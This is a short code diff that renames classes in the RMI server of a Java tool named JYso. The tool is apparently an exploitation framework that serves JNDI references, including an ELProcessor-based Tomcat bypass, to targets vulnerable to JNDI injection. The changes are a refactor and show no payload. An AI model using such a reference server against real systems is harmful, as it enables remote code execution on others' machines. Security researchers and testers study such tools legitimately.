@@ -1,12 +1,9 @@
 package com.qi4l.JYso;
 
 
-import com.qi4l.JYso.controllers.rmi.rmiBasic;
-import com.qi4l.JYso.controllers.rmi.rmiTomcatBypass;
-import com.qi4l.JYso.gadgets.utils.Gadgets;
-import com.qi4l.JYso.gadgets.utils.InjShell;
+import com.qi4l.JYso.controllers.rmi.Basic;
+import com.qi4l.JYso.controllers.rmi.ELProcessor;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import org.apache.naming.ResourceRef;
@@ -265,12 +262,12 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             //反射调用的类名
             ReferenceWrapper rw = null;
 
-            if (object.startsWith("tomcatbypass")) {
-                ResourceRef result = rmiTomcatBypass.refTomcatBypass(object);
+            if (object.startsWith("ELProcessor")) {
+                ResourceRef result = ELProcessor.refTomcatBypass(object);
                 rw = new ReferenceWrapper(result);
             } else if (object.startsWith("basic")) {
                 rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
-                Reference result = rmiBasic.basic(object);
+                Reference result = Basic.basic(object);
                 Reflections.setFieldValue(rw, "wrappee", result);
             }
 
